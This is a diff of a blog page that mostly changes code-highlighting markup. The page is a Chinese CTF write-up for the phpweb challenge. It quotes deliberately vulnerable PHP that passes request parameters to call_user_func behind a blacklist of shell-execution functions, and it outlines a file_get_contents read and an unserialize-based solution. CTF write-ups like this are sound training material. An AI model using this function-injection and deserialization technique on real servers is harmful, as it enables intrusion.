@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      469 字
+      382 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16
+      13
        分钟
     </span>
   
@@ -240,41 +248,41 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[网鼎杯 2020 朱雀组]phpweb<img src="https://ftp.bmp.ovh/imgs/2021/02/fc3331b9a95a064c.png" srcset="/img/loading.gif">        </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一段报错信息      </p>
-<div class="hljs"><pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
-2021-02-27 06:14:05 am        </code></pre></div>
+<pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
+2021-02-27 06:14:05 am        </code></pre>
 <p>而且没五秒页面会刷新一次  </p>
 <p>抓包看看<img src="https://ftp.bmp.ovh/imgs/2021/02/0efeb58411f3be9b.png" srcset="/img/loading.gif"><br>前面一个date,后面是时间—–函数执行<br>读取<code>index.php</code><br><code>func=file_get_contents&amp;p=index.php</code>   </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params">$func, $p</span>) </span>&#123;
-        $result = call_user_func($func, $p);
-        $a= gettype($result);
-        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">&quot;string&quot;</span>) &#123;
-            <span class="hljs-keyword">return</span> $result;
-        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;
-    &#125;
-    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
-        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;
-        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">&quot;date&quot;</span>;
-        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
-            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;
-                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
-            &#125;
-        &#125;
-    &#125;
-    $func = $_REQUEST[<span class="hljs-string">&quot;func&quot;</span>];
-    $p = $_REQUEST[<span class="hljs-string">&quot;p&quot;</span>];
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"shell_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"passthru"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_open"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"show_source"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"popen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"eval"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"touch"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"substr_replace"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_filter"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"array_map"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"filter_var"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uasort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uksort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_reduce"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fopen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fwrite"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"date"</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-    <span class="hljs-keyword">if</span> ($func != <span class="hljs-literal">null</span>) &#123;
-        $func = strtolower($func);
-        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;
-            <span class="hljs-keyword">echo</span> gettime($func, $p);
-        &#125;<span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);
-        &#125;
-    &#125;</code></pre></div></code></pre>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span></span></code></pre></code></pre>
 <p>可以看到禁了很多函数<br>有个class<br>可以用反序列<code>unserialize</code>函数      </p>
-<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><div class="hljs"><pre><code>```php
+<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><pre><code>```php
 &lt;?php
 
 class Test &#123;
@@ -286,7 +294,7 @@ class Test &#123;
 $a=new Test();
 $b=serialize($a);
 echo $b;       
-```    </code></pre></div>
+```    </code></pre>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>序列化</li>
 <li><code>call_user_func</code>       <blockquote>
@@ -438,6 +446,8 @@ echo $b;
 
 
 
+  
+    
   
 
 
